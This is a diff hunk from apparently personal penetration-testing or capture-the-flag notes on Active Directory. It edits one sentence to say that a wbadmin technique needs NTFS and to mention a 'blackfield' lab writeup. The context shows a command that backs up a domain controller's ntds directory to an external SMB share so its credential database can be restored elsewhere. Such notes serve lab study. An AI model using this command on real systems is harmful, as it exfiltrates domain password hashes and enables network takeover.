@@ -89,7 +89,7 @@ SamAccountName: Administrator
 <...snip...>
 ```
 
-Alternatively, if we have already mounted an smb drive to it, we can use wbadmin to have window "backup" the ntds directory to our smb server, then restore it:
+Alternatively, if we have already mounted an smb drive to it, we can use wbadmin to have window "backup" the ntds directory to our smb server, then restore it (require ntfs format, which we can reference blackfield lab writeup):
 ```
 #Assuming the smb is connected as A:
 echo "Y" | wbadmin start backup -backuptarget:\\<ip>\<sharename> -include:c:\windows\ntds
